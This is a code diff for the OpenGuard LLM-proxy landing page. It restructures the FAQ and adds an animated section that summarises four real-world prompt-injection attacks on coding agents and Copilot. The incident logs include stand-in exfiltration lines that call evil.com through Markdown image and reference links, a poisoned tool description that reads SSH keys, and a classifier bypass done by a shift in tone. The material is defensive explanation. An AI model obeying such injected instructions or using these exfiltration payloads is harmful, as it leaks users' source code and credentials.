@@ -1,5 +1,57 @@
 ---
 import SiteHeader from '../components/SiteHeader.astro';
+
+const faqItems = [
+    {
+        question: 'Does OpenGuard add latency?',
+        answer: 'Guards run on input before forwarding to the provider. Regex-based guards add negligible overhead. The llm_input_inspection guard adds a full LLM round-trip since it sends the prompt to an inspection model first.'
+    },
+    {
+        question: 'Does OpenGuard work with streaming?',
+        answer: 'Yes. Guards evaluate the input before the request is forwarded. The streaming response from the provider is proxied straight through to your client.'
+    },
+    {
+        question: 'Does OpenGuard collect telemetry?',
+        answer: 'No. OpenGuard only connects to the LLM providers you explicitly configure. Nothing phones home.'
+    },
+    {
+        question: 'What LLM providers work with OpenGuard?',
+        answer: 'Any provider exposing /v1/chat/completions (OpenAI-compatible) or /v1/messages (Anthropic-compatible). OpenRouter, Azure OpenAI, local models via Ollama - anything behind those endpoints.'
+    },
+    {
+        question: 'Does OpenGuard work with LangChain or LlamaIndex?',
+        answer: 'Yes. Any library that lets you set a custom base URL works - LangChain, LlamaIndex, LiteLLM, and others. Point the base URL at http://localhost:23294/v1 and your real provider API key, and all traffic flows through the guard pipeline.'
+    },
+    {
+        question: 'Can I run OpenGuard in production or CI?',
+        answer: 'Yes. The Docker image is the recommended path for production and CI - no Python host dependency, single container, configurable via environment variables. Mount your guards.yaml and pass provider keys with -e.'
+    },
+    {
+        question: 'How do I block a specific keyword or secret?',
+        answer: 'Use the keyword_filter guard. Add the keyword or regex pattern to the keywords list in guards.yaml and set the action to block or redact. It matches across request and response content, including streamed output.'
+    },
+    {
+        question: 'Does OpenGuard support local models like Ollama?',
+        answer: 'Yes. Any model server that exposes an OpenAI-compatible endpoint (/v1/chat/completions) works - Ollama, LM Studio, vLLM, and others. No API key is required for local models.'
+    },
+    {
+        question: 'Is OpenGuard open source?',
+        answer: 'Yes. OpenGuard is MIT-licensed and available on GitHub at https://github.com/Jitera-Labs/openguard. Contributions, issues, and feature requests are welcome.'
+    }
+];
+
+const faqJsonLd = {
+    '@context': 'https://schema.org',
+    '@type': 'FAQPage',
+    mainEntity: faqItems.map(({ question, answer }) => ({
+        '@type': 'Question',
+        name: question,
+        acceptedAnswer: {
+            '@type': 'Answer',
+            text: answer,
+        },
+    })),
+};
 ---
 
 <!DOCTYPE html>
@@ -64,86 +116,7 @@ import SiteHeader from '../components/SiteHeader.astro';
             }
         }
     </script>
-    <script type="application/ld+json">
-        {
-            "@context": "https://schema.org",
-            "@type": "FAQPage",
-            "mainEntity": [
-                {
-                    "@type": "Question",
-                    "name": "Does OpenGuard add latency?",
-                    "acceptedAnswer": {
-                        "@type": "Answer",
-                        "text": "Guards run on input before forwarding to the provider. Regex-based guards add negligible overhead. The llm_input_inspection guard adds a full LLM round-trip since it sends the prompt to an inspection model first."
-                    }
-                },
-                {
-                    "@type": "Question",
-                    "name": "Does OpenGuard work with streaming?",
-                    "acceptedAnswer": {
-                        "@type": "Answer",
-                        "text": "Yes. Guards evaluate the input before the request is forwarded. The streaming response from the provider is proxied straight through to your client."
-                    }
-                },
-                {
-                    "@type": "Question",
-                    "name": "Does OpenGuard collect telemetry?",
-                    "acceptedAnswer": {
-                        "@type": "Answer",
-                        "text": "No. OpenGuard only connects to the LLM providers you explicitly configure. Nothing phones home."
-                    }
-                },
-                {
-                    "@type": "Question",
-                    "name": "What LLM providers work with OpenGuard?",
-                    "acceptedAnswer": {
-                        "@type": "Answer",
-                        "text": "Any provider exposing /v1/chat/completions (OpenAI-compatible) or /v1/messages (Anthropic-compatible). OpenRouter, Azure OpenAI, local models via Ollama — anything behind those endpoints."
-                    }
-                },
-                {
-                    "@type": "Question",
-                    "name": "Does OpenGuard work with LangChain or LlamaIndex?",
-                    "acceptedAnswer": {
-                        "@type": "Answer",
-                        "text": "Yes. Any library that lets you set a custom base URL works — LangChain, LlamaIndex, LiteLLM, and others. Point the base URL at http://localhost:23294/v1 and your real provider API key, and all traffic flows through the guard pipeline."
-                    }
-                },
-                {
-                    "@type": "Question",
-                    "name": "Can I run OpenGuard in production or CI?",
-                    "acceptedAnswer": {
-                        "@type": "Answer",
-                        "text": "Yes. The Docker image is the recommended path for production and CI — no Python host dependency, single container, configurable via environment variables. Mount your guards.yaml and pass provider keys with -e."
-                    }
-                },
-                {
-                    "@type": "Question",
-                    "name": "How do I block a specific keyword or secret?",
-                    "acceptedAnswer": {
-                        "@type": "Answer",
-                        "text": "Use the keyword_filter guard. Add the keyword or regex pattern to the keywords list in guards.yaml and set the action to block or redact. It matches across request and response content, including streamed output."
-                    }
-                },
-                {
-                    "@type": "Question",
-                    "name": "Does OpenGuard support local models like Ollama?",
-                    "acceptedAnswer": {
-                        "@type": "Answer",
-                        "text": "Yes. Any model server that exposes an OpenAI-compatible endpoint (/v1/chat/completions) works — Ollama, LM Studio, vLLM, and others. No API key is required for local models."
-                    }
-                },
-                {
-                    "@type": "Question",
-                    "name": "Is OpenGuard open source?",
-                    "acceptedAnswer": {
-                        "@type": "Answer",
-                        "text": "Yes. OpenGuard is MIT-licensed and available on GitHub at https://github.com/Jitera-Labs/openguard. Contributions, issues, and feature requests are welcome."
-                    }
-                }
-            ]
-        }
-    </script>
+    <script type="application/ld+json" set:html={JSON.stringify(faqJsonLd)}></script>
     <script type="application/ld+json">
         {
             "@context": "https://schema.org",
@@ -1486,6 +1459,300 @@ import SiteHeader from '../components/SiteHeader.astro';
             }
         }
 
+        /* ===== #threat-chain ===== */
+        #threat-chain {
+            min-height: unset;
+            padding: 100px 32px 80px;
+            align-items: center;
+            justify-content: flex-start;
+            text-align: center;
+        }
+
+        .threat-shell {
+            width: 100%;
+            max-width: 960px;
+            display: flex;
+            flex-direction: column;
+            gap: 48px;
+        }
+
+        .threat-header {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            align-items: center;
+        }
+
+        .threat-kicker {
+            font-family: var(--font-mono);
+            font-size: 11px;
+            letter-spacing: 0.18em;
+            text-transform: uppercase;
+            color: rgba(255,255,255,0.45);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        #threat-chain h2 {
+            font-family: var(--font-pixel-grid);
+            font-size: clamp(28px, 4vw, 36px);
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            line-height: 1.2;
+        }
+
+        .threat-intro {
+            font-family: var(--font-mono);
+            font-size: 15px;
+            line-height: 1.7;
+            color: rgba(255,255,255,0.55);
+            max-width: 620px;
+            margin: 0 auto;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* --- attack chain pipeline --- */
+        .attack-chain {
+            position: relative;
+            width: 100%;
+            border: 1px solid #222;
+            background: rgba(8, 8, 8, 0.85);
+            overflow: hidden;
+        }
+
+        .chain-tabs {
+            display: flex;
+            border-bottom: 1px solid #222;
+        }
+
+        .chain-tab {
+            position: relative;
+            flex: 1;
+            padding: 12px 16px;
+            font-family: var(--font-mono);
+            font-size: 12px;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            color: #555;
+            cursor: pointer;
+            transition: color 200ms, background 200ms;
+            border-right: 1px solid #222;
+            user-select: none;
+            text-align: center;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .chain-tab:last-child { border-right: none; }
+        .chain-tab:hover { color: #999; background: rgba(255,255,255,0.02); }
+        .chain-tab.active { color: #fff; }
+
+        .chain-tab-bar {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            height: 2px;
+            width: 0%;
+            background: #555;
+        }
+
+        .chain-tab.active .chain-tab-bar {
+            transition: width 8s linear;
+            width: 100%;
+        }
+
+        .chain-body {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            min-height: 360px;
+        }
+
+        /* --- left: animated stage viz --- */
+        .chain-stage-panel {
+            padding: 24px;
+            border-right: 1px solid #222;
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+            text-align: left;
+        }
+
+        .chain-stage-row {
+            display: grid;
+            grid-template-columns: 96px 1fr;
+            gap: 0;
+            align-items: stretch;
+        }
+
+        .chain-stage-label {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            padding-right: 16px;
+            font-family: var(--font-mono);
+            font-size: 10px;
+            letter-spacing: 0.15em;
+            text-transform: uppercase;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .chain-stage-box {
+            position: relative;
+            padding: 14px 16px;
+            border-left: 3px solid var(--stage-color, #333);
+            background: rgba(255,255,255,0.015);
+            transition: background 400ms, border-color 400ms;
+            min-height: 62px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .chain-stage-box.active {
+            background: rgba(255,255,255,0.04);
+        }
+
+        .chain-stage-name {
+            font-family: var(--font-mono);
+            font-size: 14px;
+            color: #fff;
+            -webkit-font-smoothing: antialiased;
+            margin-bottom: 4px;
+        }
+
+        .chain-stage-detail {
+            font-family: var(--font-mono);
+            font-size: 12px;
+            color: rgba(255,255,255,0.45);
+            -webkit-font-smoothing: antialiased;
+            opacity: 0;
+            transform: translateY(4px);
+            transition: opacity 300ms, transform 300ms;
+        }
+
+        .chain-stage-box.active .chain-stage-detail {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .chain-arrow {
+            grid-column: 2;
+            height: 28px;
+            display: flex;
+            justify-content: center;
+            align-self: flex-start;
+            margin-left: 2.4rem;
+        }
+
+        .chain-arrow-line {
+            width: 1px;
+            height: 100%;
+            background: #333;
+            position: relative;
+        }
+
+        /* pulse dot */
+        .chain-dot {
+            position: absolute;
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--stage-color, #555);
+            box-shadow: 0 0 8px var(--stage-color, #555);
+            left: -3px;
+            top: -3px;
+            opacity: 0;
+        }
+
+        .chain-dot.traveling {
+            opacity: 1;
+            transition: top 600ms cubic-bezier(0.4, 0, 0.2, 1);
+            top: calc(100% - 3px);
+        }
+
+        /* --- right: terminal incident log --- */
+        .chain-log-panel {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .chain-log-panel .term-chrome {
+            border: none;
+            border-bottom: 1px solid #222;
+            background: rgba(255,255,255,0.02);
+        }
+
+        .chain-log-body {
+            flex: 1;
+            padding: 20px;
+            font-family: var(--font-mono);
+            font-size: 12px;
+            line-height: 1.85;
+            color: rgba(255,255,255,0.75);
+            -webkit-font-smoothing: antialiased;
+            overflow: hidden;
+            text-align: left;
+        }
+
+        .chain-log-line {
+            display: block;
+            opacity: 0;
+            transform: translateX(6px);
+            transition: opacity 200ms, transform 200ms;
+        }
+
+        .chain-log-line.visible {
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .chain-footer {
+            border-top: 1px solid #222;
+            padding: 14px 20px;
+            font-family: var(--font-mono);
+            font-size: 12px;
+            color: rgba(255,255,255,0.4);
+            -webkit-font-smoothing: antialiased;
+            text-align: center;
+        }
+
+        .chain-footer strong {
+            color: rgba(255,255,255,0.7);
+            font-weight: 400;
+        }
+
+        @media (max-width: 800px) {
+            .chain-body {
+                grid-template-columns: 1fr;
+            }
+
+            .chain-stage-panel {
+                border-right: none;
+                border-bottom: 1px solid #222;
+            }
+
+            .chain-body { min-height: unset; }
+        }
+
+        @media (max-width: 600px) {
+            #threat-chain { padding: 64px 20px 56px; }
+
+            .chain-tab { font-size: 10px; padding: 10px 8px; letter-spacing: 0.06em; }
+
+            .chain-stage-row { grid-template-columns: 72px 1fr; }
+
+            .chain-log-body { font-size: 11px; padding: 14px 16px; }
+
+            .chain-stage-name { font-size: 13px; }
+            .chain-stage-detail { font-size: 11px; }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            .chain-tab.active .chain-tab-bar { transition: none; }
+            .chain-stage-detail { transition: none; }
+            .chain-dot { transition: none; }
+            .chain-log-line { transition: none; }
+        }
+
         /* ===== #supported-agents ===== */
         #supported-agents {
             min-height: unset;
@@ -1913,6 +2180,28 @@ client = <span class="t-cyan">OpenAI</span>(
             </div>
         </section>
 
+        <section id="threat-chain">
+            <div class="threat-shell">
+                <div class="threat-header">
+                    <span class="threat-kicker">Real attacks on coding agents, 2024–2026</span>
+                    <h2>How Prompt Injection Actually Works</h2>
+                    <p class="threat-intro">Injections don't come through the chat box. They arrive through context your agent already trusts — issues, tool descriptions, documents — then ride the agent's own permissions out.</p>
+                </div>
+
+                <div class="attack-chain">
+                    <div class="chain-tabs" id="chain-tabs"></div>
+                    <div class="chain-body">
+                        <div class="chain-stage-panel" id="chain-stages"></div>
+                        <div class="chain-log-panel">
+                            <div class="term-chrome"><span class="term-dot"></span><span class="term-dot"></span><span class="term-dot"></span><span class="term-title">incident.log</span></div>
+                            <div class="chain-log-body" id="chain-log"></div>
+                        </div>
+                    </div>
+                    <div class="chain-footer">OpenGuard inspects every prompt <strong>before</strong> it leaves your machine — blocking the chain at stage one.</div>
+                </div>
+            </div>
+        </section>
+
         <section id="modular-stack">
              <div class="architecture-container">
                 <h2>MODULAR LLM SECURITY STACK</h2>
@@ -2051,42 +2340,12 @@ client = <span class="t-cyan">OpenAI</span>(
         <section id="faq">
             <h2>FAQ</h2>
             <div class="faq-list">
-                <div class="faq-item">
-                    <h3 class="faq-q">Does it add latency?</h3>
-                    <p class="faq-a">Guards run on input before forwarding to the provider. Regex-based guards do fast string matching with negligible overhead. The llm_input_inspection guard adds a full LLM round-trip since it sends the prompt to an inspection model first. No benchmarks published yet.</p>
-                </div>
-                <div class="faq-item">
-                    <h3 class="faq-q">Does it work with streaming?</h3>
-                    <p class="faq-a">Yes. Guards evaluate the input before the request is forwarded. The streaming response from the provider is proxied straight through to your client.</p>
-                </div>
-                <div class="faq-item">
-                    <h3 class="faq-q">Does it collect telemetry?</h3>
-                    <p class="faq-a">No. OpenGuard only connects to the LLM providers you explicitly configure. Nothing phones home.</p>
-                </div>
-                <div class="faq-item">
-                    <h3 class="faq-q">What providers work?</h3>
-                    <p class="faq-a">Any provider exposing /v1/chat/completions (OpenAI-compatible) or /v1/messages (Anthropic-compatible). OpenRouter, Azure OpenAI, local models via Ollama — anything behind those endpoints.</p>
-                </div>
-                <div class="faq-item">
-                    <h3 class="faq-q">Does OpenGuard work with LangChain or LlamaIndex?</h3>
-                    <p class="faq-a">Yes. Any library that lets you set a custom base URL works — LangChain, LlamaIndex, LiteLLM, and others. Point the base URL at <code style="display:inline;padding:0.1em 0.3em;font-size:0.8em;">http://localhost:23294/v1</code> and your real provider API key, and all traffic flows through the guard pipeline.</p>
-                </div>
-                <div class="faq-item">
-                    <h3 class="faq-q">Can I run OpenGuard in production or CI?</h3>
-                    <p class="faq-a">Yes. The Docker image is the recommended path for production and CI — no Python host dependency, single container, configurable via environment variables. Mount your guards.yaml and pass provider keys with <code style="display:inline;padding:0.1em 0.3em;font-size:0.8em;">-e</code>.</p>
-                </div>
-                <div class="faq-item">
-                    <h3 class="faq-q">How do I block a specific keyword or secret?</h3>
-                    <p class="faq-a">Use the keyword_filter guard. Add the keyword or regex pattern to the keywords list in guards.yaml and set the action to block or redact. It matches across request and response content, including streamed output.</p>
-                </div>
-                <div class="faq-item">
-                    <h3 class="faq-q">Does OpenGuard support local models like Ollama?</h3>
-                    <p class="faq-a">Yes. Any model server that exposes an OpenAI-compatible endpoint (/v1/chat/completions) works — Ollama, LM Studio, vLLM, and others. No API key is required for local models.</p>
-                </div>
-                <div class="faq-item">
-                    <h3 class="faq-q">Is OpenGuard open source?</h3>
-                    <p class="faq-a">Yes. OpenGuard is MIT-licensed and available on <a href="https://github.com/Jitera-Labs/openguard" style="color:inherit;opacity:0.8;">GitHub</a>. Contributions, issues, and feature requests are welcome.</p>
-                </div>
+                {faqItems.map(({ question, answer }) => (
+                    <div class="faq-item">
+                        <h3 class="faq-q">{question}</h3>
+                        <p class="faq-a">{answer}</p>
+                    </div>
+                ))}
             </div>
         </section>
 
@@ -2908,6 +3167,223 @@ client = <span class="t-cyan">OpenAI</span>(
         }
 
         startModularViz();
+
+        // ===== Attack Chain Visualizer =====
+        function startAttackChain() {
+            const tabsEl = document.getElementById('chain-tabs');
+            const stagesEl = document.getElementById('chain-stages');
+            const logEl = document.getElementById('chain-log');
+            if (!tabsEl || !stagesEl || !logEl) return;
+
+            const CYCLE = 8000;
+
+            const incidents = [
+                {
+                    tab: 'GitHub Issue → Private Repos',
+                    stages: [
+                        { label: 'ingress', color: '#ffb74d', name: 'Public GitHub issue', detail: 'MCP server fetches issue as agent context' },
+                        { label: 'hijack', color: '#ef9a9a', name: 'Instruction injection', detail: 'Hidden text tells agent to enumerate repos' },
+                        { label: 'exfil', color: '#ce93d8', name: 'PR metadata leak', detail: 'Private repo names encoded in branch name' }
+                    ],
+                    log: [
+                        '<span class="t-dim">source</span>    github.com/org/repo/issues/47',
+                        '<span class="t-dim">vector</span>    issue body contained hidden instructions',
+                        '<span class="t-dim">action</span>    agent ran <span class="t-bright">list_repos</span> via MCP',
+                        '<span class="t-red">hijack</span>    enumerated 12 private repositories',
+                        '<span class="t-orange">exfil</span>     created PR with repo names in branch',
+                        '',
+                        '<span class="t-dim">ref</span>       Invariant Labs, May 2025',
+                        '<span class="t-dim">target</span>    GitHub official MCP server'
+                    ]
+                },
+                {
+                    tab: 'Merge Request → Source Code',
+                    stages: [
+                        { label: 'ingress', color: '#ffb74d', name: 'MR comment with hidden text', detail: 'GitLab Duo reads comment as context' },
+                        { label: 'hijack', color: '#ef9a9a', name: 'Prompt override', detail: 'Agent copies source into its output buffer' },
+                        { label: 'exfil', color: '#ce93d8', name: 'Markdown image URL', detail: 'Code base64-encoded as image URL param' }
+                    ],
+                    log: [
+                        '<span class="t-dim">source</span>    gitlab.com/org/repo/-/merge_requests/31',
+                        '<span class="t-dim">vector</span>    comment injected via merge_request_reader',
+                        '<span class="t-dim">action</span>    Duo rendered Markdown with embedded URL',
+                        '<span class="t-red">hijack</span>    source code written to output buffer',
+                        '<span class="t-orange">exfil</span>     <span class="t-bright">![x](evil.com/log?d=&lt;base64-src&gt;)</span>',
+                        '',
+                        '<span class="t-dim">ref</span>       LegitSecurity, May 2025',
+                        '<span class="t-dim">target</span>    GitLab Duo'
+                    ]
+                },
+                {
+                    tab: 'MCP Tool → Credential Theft',
+                    stages: [
+                        { label: 'ingress', color: '#ffb74d', name: 'Poisoned tool description', detail: 'Hidden &lt;IMPORTANT&gt; block in add() metadata' },
+                        { label: 'hijack', color: '#ef9a9a', name: 'Silent file read', detail: 'Agent reads ~/.cursor/mcp.json + SSH keys' },
+                        { label: 'exfil', color: '#ce93d8', name: 'Tool argument smuggle', detail: 'Secrets passed as "sidenote" parameter' }
+                    ],
+                    log: [
+                        '<span class="t-dim">source</span>    malicious MCP server (add tool)',
+                        '<span class="t-dim">vector</span>    tool desc: "read mcp.json, pass as sidenote"',
+                        '<span class="t-dim">action</span>    agent read <span class="t-bright">~/.cursor/mcp.json</span>',
+                        '<span class="t-dim">action</span>    agent read <span class="t-bright">~/.ssh/id_rsa</span>',
+                        '<span class="t-red">hijack</span>    credentials extracted from config',
+                        '<span class="t-orange">exfil</span>     passed as hidden function argument',
+                        '',
+                        '<span class="t-dim">ref</span>       Invariant Labs, April 2025',
+                        '<span class="t-dim">target</span>    Cursor IDE'
+                    ]
+                },
+                {
+                    tab: 'Email + PDF → Data Exfil',
+                    stages: [
+                        { label: 'ingress', color: '#ffb74d', name: 'Poisoned email / PDF context', detail: 'RAG retrieves attacker content by keyword' },
+                        { label: 'hijack', color: '#ef9a9a', name: 'XPIA classifier bypass', detail: 'Phrased as human-to-human to evade filters' },
+                        { label: 'exfil', color: '#ce93d8', name: 'Reference-link exfil', detail: '[ref]: evil.com?d=<stolen> bypasses CSP' }
+                    ],
+                    log: [
+                        '<span class="t-dim">source</span>    attacker email keyword-stuffed for RAG',
+                        '<span class="t-dim">vector</span>    M365 Copilot retrieved email as context',
+                        '<span class="t-dim">action</span>    injection phrased as user-to-user text',
+                        '<span class="t-red">hijack</span>    XPIA classifier bypassed by tone shift',
+                        '<span class="t-orange">exfil</span>     reference link syntax + open redirect',
+                        '',
+                        '<span class="t-dim">ref</span>       CVE-2025-32711 (EchoLeak), Jan 2025',
+                        '<span class="t-dim">target</span>    Microsoft 365 Copilot'
+                    ]
+                }
+            ];
+
+            // Build tabs
+            incidents.forEach(function(inc, i) {
+                const tab = document.createElement('div');
+                tab.className = 'chain-tab' + (i === 0 ? ' active' : '');
+                tab.textContent = inc.tab;
+                tab.innerHTML += '<div class="chain-tab-bar"></div>';
+                tab.addEventListener('click', function() { goTo(i); });
+                tabsEl.appendChild(tab);
+            });
+
+            let current = -1;
+            let timer = null;
+
+            function renderStages(idx) {
+                const inc = incidents[idx];
+                stagesEl.innerHTML = '';
+
+                inc.stages.forEach(function(s, si) {
+                    // Stage row
+                    const row = document.createElement('div');
+                    row.className = 'chain-stage-row';
+
+                    const label = document.createElement('div');
+                    label.className = 'chain-stage-label';
+                    label.style.color = s.color;
+                    label.textContent = s.label;
+
+                    const box = document.createElement('div');
+                    box.className = 'chain-stage-box';
+                    box.style.setProperty('--stage-color', s.color);
+
+                    const name = document.createElement('div');
+                    name.className = 'chain-stage-name';
+                    name.textContent = s.name;
+
+                    const detail = document.createElement('div');
+                    detail.className = 'chain-stage-detail';
+                    detail.textContent = s.detail;
+
+                    box.appendChild(name);
+                    box.appendChild(detail);
+                    row.appendChild(label);
+                    row.appendChild(box);
+                    stagesEl.appendChild(row);
+
+                    // Arrow + traveling dot between stages
+                    if (si < inc.stages.length - 1) {
+                        const arrow = document.createElement('div');
+                        arrow.className = 'chain-arrow';
+
+                        const line = document.createElement('div');
+                        line.className = 'chain-arrow-line';
+
+                        const dot = document.createElement('div');
+                        dot.className = 'chain-dot';
+                        dot.style.setProperty('--stage-color', inc.stages[si + 1].color);
+                        line.appendChild(dot);
+                        arrow.appendChild(line);
+                        stagesEl.appendChild(arrow);
+                    }
+
+                    // Stagger activation
+                    setTimeout(function() {
+                        box.classList.add('active');
+                    }, 300 + si * 700);
+                });
+
+                // Animate dots
+                const dots = stagesEl.querySelectorAll('.chain-dot');
+                dots.forEach(function(dot, di) {
+                    setTimeout(function() {
+                        dot.classList.add('traveling');
+                    }, 600 + di * 700);
+                });
+            }
+
+            function renderLog(idx) {
+                const lines = incidents[idx].log;
+                logEl.innerHTML = '';
+
+                lines.forEach(function(html, li) {
+                    const span = document.createElement('span');
+                    span.className = 'chain-log-line';
+                    span.innerHTML = html || '&nbsp;';
+                    logEl.appendChild(span);
+
+                    setTimeout(function() {
+                        span.classList.add('visible');
+                    }, 400 + li * 150);
+                });
+            }
+
+            function goTo(idx) {
+                if (idx === current) return;
+                current = idx;
+
+                // Update tabs
+                tabsEl.querySelectorAll('.chain-tab').forEach(function(t, ti) {
+                    t.classList.toggle('active', ti === idx);
+                    // Reset progress bar
+                    var bar = t.querySelector('.chain-tab-bar');
+                    if (bar) {
+                        bar.style.transition = 'none';
+                        bar.style.width = '0%';
+                        if (ti === idx) {
+                            // Force reflow then animate
+                            void bar.offsetWidth;
+                            bar.style.transition = 'width ' + (CYCLE / 1000) + 's linear';
+                            bar.style.width = '100%';
+                        }
+                    }
+                });
+
+                renderStages(idx);
+                renderLog(idx);
+                resetTimer();
+            }
+
+            function advance() {
+                goTo((current + 1) % incidents.length);
+            }
+
+            function resetTimer() {
+                if (timer) clearInterval(timer);
+                timer = setInterval(advance, CYCLE);
+            }
+
+            advance();
+        }
+
+        startAttackChain();
 
         function startFontToggle() {
             const fonts = [
